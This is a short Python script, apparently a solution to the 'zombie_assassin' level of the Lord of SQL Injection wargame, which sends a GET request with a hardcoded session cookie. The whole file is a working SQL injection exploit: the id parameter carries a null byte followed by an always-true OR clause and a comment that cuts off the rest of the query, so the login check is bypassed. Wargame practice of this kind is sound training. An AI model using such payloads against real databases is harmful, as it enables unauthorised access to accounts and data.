import requests
import string


def get(id, pw):
    return requests.get(
        'https://los.rubiya.kr/chall/zombie_assassin_eac7521e07fe5f298301a44b61ffeec0.php',
        params={"id":id, "pw":pw},
        cookies={'PHPSESSID': 'noefrhpr1bme4kn0b510mjnq01'}).text

# get just have id
print(get("\x00'||1 -- -", ''))